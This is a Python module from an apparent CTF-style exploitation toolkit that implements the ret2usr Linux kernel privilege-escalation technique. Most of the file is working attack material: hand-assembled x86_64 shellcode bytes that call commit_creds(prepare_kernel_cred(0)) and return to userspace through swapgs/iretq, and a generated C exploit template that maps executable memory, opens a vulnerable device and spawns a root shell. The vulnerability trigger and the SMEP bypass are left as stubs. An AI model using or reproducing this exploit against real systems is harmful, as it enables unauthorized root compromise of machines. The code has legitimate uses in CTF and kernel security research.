"""
ret2usr (Return to Userspace) kernel exploitation technique.

ret2usr exploits kernel vulnerabilities by redirecting kernel control flow
to execute code in userspace memory. This requires SMEP/SMAP to be disabled
or bypassed.

Technique overview:
1. Allocate executable userspace memory (mmap with PROT_EXEC)
2. Place privilege escalation shellcode in userspace
3. Trigger kernel bug to redirect execution to userspace code
4. Shellcode calls commit_creds(prepare_kernel_cred(0))
5. Return to userspace and spawn shell as root

Requirements:
- SMEP (Supervisor Mode Execution Prevention) disabled or bypassed
- SMAP (Supervisor Mode Access Prevention) disabled or bypassed
- Kernel read/write or control flow hijack primitive
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.kernel.symbols import KernelSymbols
from supwngo.utils.helpers import p64
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class Ret2usrPayload:
    """Complete ret2usr payload."""
    shellcode: bytes = b""
    shellcode_addr: int = 0
    user_rip: int = 0
    user_cs: int = 0x33
    user_rflags: int = 0x246
    user_rsp: int = 0
    user_ss: int = 0x2b


class Ret2usr:
    """
    ret2usr exploitation helper.

    Generates userspace shellcode for kernel privilege escalation.
    Use when SMEP/SMAP are disabled or have been bypassed.

    Example usage:
        symbols = KernelSymbols.from_leak("commit_creds", leaked_addr)
        ret2usr = Ret2usr(symbols)

        # Get shellcode
        shellcode = ret2usr.generate_shellcode()

        # Or generate complete C template
        code = ret2usr.generate_exploit_template()
    """

    # x86_64 shellcode templates
    # These are position-independent shellcode snippets

    # Save userspace state (CS, SS, RSP, RFLAGS)
    SAVE_STATE_ASM = """
    /* save_state() - store userspace registers */
    mov [user_cs], cs
    mov [user_ss], ss
    mov [user_rsp], rsp
    pushf
    pop qword [user_rflags]
    """

    # Escalate privileges using prepare_kernel_cred + commit_creds
    PRIVESC_ASM = """
    /* escalate_privs() - call commit_creds(prepare_kernel_cred(0)) */
    xor rdi, rdi                    /* prepare_kernel_cred(0) */
    mov rax, {prepare_kernel_cred}
    call rax
    mov rdi, rax                    /* commit_creds(new_cred) */
    mov rax, {commit_creds}
    call rax
    """

    # Return to userspace via iretq
    RETURN_USER_ASM = """
    /* return_to_user() - iretq back to userspace */
    swapgs                          /* restore user GS */
    push qword [user_ss]            /* SS */
    push qword [user_rsp]           /* RSP */
    push qword [user_rflags]        /* RFLAGS */
    push qword [user_cs]            /* CS */
    push {user_rip}                 /* RIP */
    iretq
    """

    def __init__(self, symbols: KernelSymbols):
        """
        Initialize ret2usr handler.

        Args:
            symbols: KernelSymbols instance with resolved addresses
        """
        self.symbols = symbols
        self.kernel_base = symbols.kernel_base

    def generate_shellcode(
        self,
        user_rip: int = 0,
        technique: str = "commit_creds",
    ) -> bytes:
        """
        Generate x86_64 privilege escalation shellcode.

        Args:
            user_rip: Address to return to in userspace (usually win function)
            technique: Technique to use ("commit_creds" or "init_cred")

        Returns:
            Position-independent shellcode bytes
        """
        try:
            if technique == "commit_creds":
                return self._generate_commit_creds_shellcode(user_rip)
            elif technique == "init_cred":
                return self._generate_init_cred_shellcode(user_rip)
            else:
                raise ValueError(f"Unknown technique: {technique}")
        except Exception as e:
            logger.error(f"Failed to generate shellcode: {e}")
            return b""

    def _generate_commit_creds_shellcode(self, user_rip: int) -> bytes:
        """
        Generate commit_creds(prepare_kernel_cred(0)) shellcode.

        Standard privilege escalation that creates new root credentials.
        """
        try:
            prepare_kernel_cred = self.symbols.resolve("prepare_kernel_cred")
            commit_creds = self.symbols.resolve("commit_creds")
        except KeyError as e:
            logger.error(f"Missing symbol: {e}")
            return b""

        # x86_64 shellcode
        # This is handcrafted shellcode that:
        # 1. Saves userspace state
        # 2. Calls prepare_kernel_cred(0)
        # 3. Calls commit_creds(result)
        # 4. Returns to userspace via swapgs + iretq

        # Shellcode bytes
        shellcode = bytearray()

        # xor rdi, rdi  (prepare_kernel_cred(0))
        shellcode.extend([0x48, 0x31, 0xff])

        # movabs rax, prepare_kernel_cred
        shellcode.extend([0x48, 0xb8])
        shellcode.extend(p64(prepare_kernel_cred))

        # call rax
        shellcode.extend([0xff, 0xd0])

        # mov rdi, rax  (commit_creds(new_cred))
        shellcode.extend([0x48, 0x89, 0xc7])

        # movabs rax, commit_creds
        shellcode.extend([0x48, 0xb8])
        shellcode.extend(p64(commit_creds))

        # call rax
        shellcode.extend([0xff, 0xd0])

        # Now return to userspace
        # This requires KPTI-safe return or swapgs + iretq

        # Try to use KPTI trampoline if available
        kpti_tramp = self.symbols.get_kpti_trampoline()
        if kpti_tramp:
            # jmp to trampoline with iret frame on stack
            # movabs rax, trampoline
            shellcode.extend([0x48, 0xb8])
            shellcode.extend(p64(kpti_tramp))
            # jmp rax
            shellcode.extend([0xff, 0xe0])
        else:
            # Manual swapgs + iretq
            # swapgs
            shellcode.extend([0x0f, 0x01, 0xf8])
            # iretq
            shellcode.extend([0x48, 0xcf])

        return bytes(shellcode)

    def _generate_init_cred_shellcode(self, user_rip: int) -> bytes:
        """
        Generate init_cred direct copy shellcode.

        Alternative that copies init_cred to current task's cred.
        Useful when prepare_kernel_cred is not available.
        """
        try:
            init_cred = self.symbols.resolve("init_cred")
        except KeyError:
            logger.error("init_cred symbol not found")
            return b""

        # This technique requires finding current task and copying
        # init_cred to task->cred. More complex, shown as template.
        logger.warning("init_cred technique requires additional setup")
        return b""

    def check_protections(self) -> Dict[str, bool]:
        """
        Check kernel protections affecting ret2usr.

        Returns:
            Dict of protection name to enabled status
        """
        protections = {
            "smep_enabled": False,
            "smap_enabled": False,
            "kpti_enabled": False,
            "kaslr_enabled": self.symbols.kaslr_enabled,
        }

        try:
            # Check /proc/cpuinfo for SMEP/SMAP
            with open("/proc/cpuinfo", "r") as f:
                cpuinfo = f.read()
                protections["smep_enabled"] = "smep" in cpuinfo.lower()
                protections["smap_enabled"] = "smap" in cpuinfo.lower()

            # Check for KPTI via cpu_entry_area presence
            protections["kpti_enabled"] = "cpu_entry_area" in str(self.symbols.symbols)

        except Exception as e:
            logger.debug(f"Error checking protections: {e}")

        return protections

    def can_use_ret2usr(self) -> Tuple[bool, str]:
        """
        Check if ret2usr is feasible.

        Returns:
            Tuple of (feasible, reason)
        """
        protections = self.check_protections()

        if protections.get("smep_enabled"):
            return False, "SMEP is enabled - need SMEP bypass first"

        if protections.get("smap_enabled"):
            return False, "SMAP is enabled - kernel can't read userspace"

        return True, "ret2usr is feasible (SMEP/SMAP disabled)"

    def generate_smep_bypass_chain(self) -> bytes:
        """
        Generate ROP chain to disable SMEP via CR4.

        SMEP is controlled by bit 20 of CR4.
        Chain: pop rdi; mov cr4, rdi; ret (with CR4 value clearing SMEP bit)
        """
        chain = []

        try:
            # Need gadgets from kernel
            # This is kernel version specific

            # Typical CR4 values:
            # With SMEP/SMAP: 0x00000000001006f0
            # Without SMEP:   0x00000000000006f0
            # Without both:   0x00000000000006f0

            # Pattern: native_write_cr4 function or mov cr4, rdi gadget
            logger.warning("SMEP bypass requires kernel-specific gadgets")

        except Exception as e:
            logger.error(f"Failed to generate SMEP bypass: {e}")

        return b"".join(chain)

    def generate_payload(
        self,
        mmap_addr: int = 0x414141000,
        win_func: int = 0,
    ) -> Ret2usrPayload:
        """
        Generate complete ret2usr payload.

        Args:
            mmap_addr: Address to mmap shellcode (must be user-accessible)
            win_func: Address of win function in userspace

        Returns:
            Ret2usrPayload with all components
        """
        payload = Ret2usrPayload()
        payload.shellcode_addr = mmap_addr
        payload.user_rip = win_func
        payload.shellcode = self.generate_shellcode(win_func)

        return payload

    def generate_exploit_template(
        self,
        device_path: str = "/dev/vuln",
    ) -> str:
        """
        Generate complete C exploit template for ret2usr.

        Args:
            device_path: Path to vulnerable device

        Returns:
            C source code string
        """
        try:
            prepare_kernel_cred = self.symbols.resolve("prepare_kernel_cred")
            commit_creds = self.symbols.resolve("commit_creds")
        except KeyError:
            prepare_kernel_cred = 0
            commit_creds = 0

        return f'''/*
 * ret2usr Kernel Exploit Template
 * Generated by supwngo
 *
 * Requirements:
 * - SMEP disabled (or bypassed)
 * - SMAP disabled (or bypassed)
 * - Control flow hijack primitive
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define DEVICE_PATH "{device_path}"

/* Kernel addresses (compute from KASLR leak) */
unsigned long kbase = 0x{self.kernel_base:x};
unsigned long prepare_kernel_cred = 0x{prepare_kernel_cred:x};
unsigned long commit_creds = 0x{commit_creds:x};

/* Userspace state for iretq */
unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state() {{
    __asm__ volatile(
        "mov %%cs, %0\\n"
        "mov %%ss, %1\\n"
        "mov %%rsp, %2\\n"
        "pushf\\n"
        "pop %3\\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}}

void win() {{
    if (getuid() == 0) {{
        printf("[+] Got root!\\n");
        system("/bin/sh");
    }} else {{
        printf("[-] Exploit failed, uid=%d\\n", getuid());
        exit(1);
    }}
}}

/* Privilege escalation shellcode executed in kernel context */
void __attribute__((naked)) escalate_privs() {{
    __asm__ volatile(
        /* prepare_kernel_cred(0) */
        "xor %%rdi, %%rdi\\n"
        "movabs %0, %%rax\\n"
        "call *%%rax\\n"

        /* commit_creds(new_cred) */
        "mov %%rax, %%rdi\\n"
        "movabs %1, %%rax\\n"
        "call *%%rax\\n"

        /* Return to userspace via swapgs + iretq */
        "swapgs\\n"
        "mov %2, %%rax\\n"
        "push %%rax\\n"         /* SS */
        "mov %3, %%rax\\n"
        "push %%rax\\n"         /* RSP */
        "mov %4, %%rax\\n"
        "push %%rax\\n"         /* RFLAGS */
        "mov %5, %%rax\\n"
        "push %%rax\\n"         /* CS */
        "lea win(%%rip), %%rax\\n"
        "push %%rax\\n"         /* RIP */
        "iretq\\n"
        :
        : "i"(&prepare_kernel_cred),
          "i"(&commit_creds),
          "m"(user_ss),
          "m"(user_rsp),
          "m"(user_rflags),
          "m"(user_cs)
    );
}}

int main() {{
    int fd;
    void *shellcode_page;

    printf("[*] ret2usr exploit\\n");

    /* Save userspace state for iretq */
    save_state();
    printf("[+] Saved userspace state\\n");

    /* Allocate executable page for shellcode */
    shellcode_page = mmap(
        (void*)0x414141000,
        0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANON | MAP_PRIVATE | MAP_FIXED,
        -1, 0
    );
    if (shellcode_page == MAP_FAILED) {{
        perror("mmap");
        return 1;
    }}

    /* Copy shellcode to allocated page */
    memcpy(shellcode_page, (void*)escalate_privs, 0x100);
    printf("[+] Shellcode at %p\\n", shellcode_page);

    /* Open vulnerable device */
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {{
        perror("open device");
        return 1;
    }}
    printf("[+] Opened device\\n");

    /*
     * TODO: Trigger vulnerability to redirect kernel RIP to shellcode_page
     *
     * Example for function pointer overwrite:
     *   struct {{
     *       void (*callback)(void);
     *   }} evil = {{ .callback = shellcode_page }};
     *   ioctl(fd, VULN_IOCTL, &evil);
     *
     * Example for ROP to pivot:
     *   Use kernel gadgets to set RIP = shellcode_page
     */

    printf("[*] Triggering vulnerability...\\n");
    // ioctl(fd, VULN_CMD, ...);

    /* Should not reach here */
    printf("[-] Exploit failed\\n");
    return 1;
}}
'''

    def summary(self) -> str:
        """Get technique summary."""
        feasible, reason = self.can_use_ret2usr()
        protections = self.check_protections()

        return f"""
ret2usr Analysis
================
Feasible: {feasible}
Reason: {reason}

Kernel base: 0x{self.kernel_base:x}

Protection Status:
  SMEP: {'Enabled' if protections.get('smep_enabled') else 'Disabled'}
  SMAP: {'Enabled' if protections.get('smap_enabled') else 'Disabled'}
  KPTI: {'Enabled' if protections.get('kpti_enabled') else 'Disabled'}
  KASLR: {'Enabled' if protections.get('kaslr_enabled') else 'Disabled'}

Usage:
  ret2usr = Ret2usr(symbols)
  shellcode = ret2usr.generate_shellcode()
  # or
  template = ret2usr.generate_exploit_template()

Note: ret2usr requires SMEP/SMAP to be disabled or bypassed first.
Modern kernels have these enabled by default.
"""


__all__ = [
    "Ret2usr",
    "Ret2usrPayload",
]
